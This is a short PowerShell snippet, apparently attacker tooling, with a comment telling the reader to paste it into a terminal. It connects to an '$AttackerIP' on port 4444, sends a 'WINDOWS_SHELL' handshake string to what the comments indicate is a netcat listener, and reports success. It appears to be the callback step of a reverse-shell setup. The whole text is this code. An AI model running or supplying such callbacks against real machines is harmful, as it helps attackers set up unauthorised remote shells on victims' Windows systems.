#Copy and paste right into the terminal.... no need to pass parameters to a file...
$AttackerIP="10.0.13.7"; $Port=4444;
# Handshake more compatible with 'nc | head -n 1'
try {
    $h = New-Object System.Net.Sockets.TCPClient($AttackerIP, $Port);
    $s = $h.GetStream();
    $b = [System.Text.Encoding]::ASCII.GetBytes("WINDOWS_SHELL`n");
    $s.Write($b, 0, $b.Length);
    $s.Flush();
    Start-Sleep -Milliseconds 500; # Give nc time to "swallow" the data
    $h.Close();
    Write-Host "[+] Handshake sent!" -ForegroundColor Green
} catch {
    Write-Host "[!] Error: $($_.Exception.Message)" -ForegroundColor Red
}
